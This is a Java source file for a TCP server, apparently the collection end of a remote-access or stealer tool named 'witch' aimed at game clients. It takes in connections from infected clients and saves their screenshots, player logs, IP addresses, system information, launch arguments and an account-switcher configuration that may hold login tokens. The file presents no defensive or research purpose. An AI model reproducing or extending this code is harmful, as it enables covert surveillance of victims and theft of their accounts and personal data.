package me.soda.witch.server.server;

import com.google.gson.Gson;
import me.soda.witch.shared.FileUtil;
import me.soda.witch.shared.socket.Connection;
import me.soda.witch.shared.socket.TcpServer;
import me.soda.witch.shared.socket.messages.Message;
import me.soda.witch.shared.socket.messages.messages.*;

import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.ConcurrentHashMap;

public class Server extends TcpServer {
    private static int clientIndex = 0;
    public final ConcurrentHashMap<Connection, Info> clientMap = new ConcurrentHashMap<>();
    public final SendUtil sendUtil = new SendUtil();
    public final ClientConfigData defaultConfig = Utils.getDefaultClientConfig();

    public Server(int port) throws IOException {
        super();
        start(port);
    }

    private static String getFileName(String prefix, String suffix, String afterPrefix, boolean time) {
        return String.format("%s-%s%s.%s", prefix, afterPrefix, time ? LocalDateTime.now().format(DateTimeFormatter.ofPattern("-MM-dd-HH-mm-ss")) : "", suffix);
    }

    public static void log(String string) {
        System.out.println(LocalTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss")) + ": " + string);
    }

    @Override
    public void onOpen(Connection conn) {
        String address = conn.getRemoteSocketAddress().getAddress().getHostAddress();
        log("Client connected: " + address + " ID: " + clientIndex);
        clientMap.put(conn, new Info(clientIndex));
        clientIndex++;
    }

    @Override
    public void onMessage(Connection conn, Message message) {
        Info info = clientMap.get(conn);
        int id = info.index;
        log("* Received message: " + message.data.getClass().getName() + " From ID " + id);
        Gson GSON = new Gson();
        try {
            if (message.data instanceof ByteData data) {
                switch (data.id) {
                    case "screenshot", "screenshot2" -> {

                        File file = new File(Utils.getDataFile("screenshots"), getFileName(data.id + "id", "png", String.valueOf(id), true));
                        FileUtil.write(file, data.bytes());
                    }
                    case "skin" -> {
                        String playerName = info.playerData.playerName;
                        File file = new File(Utils.getDataFile("skins"), getFileName(playerName, "png", String.valueOf(id), false));
                        FileUtil.write(file, data.bytes());
                    }
                }
            } else if (message.data instanceof StringsData data) {
                if (data.data().length == 0 && data.id().equals("getconfig")) {
                    sendUtil.trySend(conn, new Message(defaultConfig));
                } else if (data.data().length == 1) {
                    String msg = data.data()[0];
                    switch (data.id()) {
                        case "logging" -> {
                            File file = new File(Utils.getDataFile("player_logs"), getFileName("id", "log", String.valueOf(id), false));
                            String oldInfo = new String(FileUtil.read(file), StandardCharsets.UTF_8);
                            FileUtil.write(file, (oldInfo + msg).getBytes(StandardCharsets.UTF_8));
                        }
                        case "ip" -> info.ip = msg;
                        case "iasconfig", "runargs", "systeminfo", "props" -> {
                            File file = new File(Utils.getDataFile("data"), getFileName(data.id(), "txt", info.playerData.playerName, true));
                            FileUtil.write(file, msg);
                        }
                    }
                }
            } else if (message.data instanceof PlayerData data) {
                info.playerData = data;
            } else {
                log("Message: " + message.data.getClass().getName() + " " + GSON.toJson(message.data));
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onClose(Connection conn, DisconnectData disconnectData) {
        log("Client disconnected: ID: " + clientMap.get(conn).index);
        clientMap.remove(conn);
    }
}
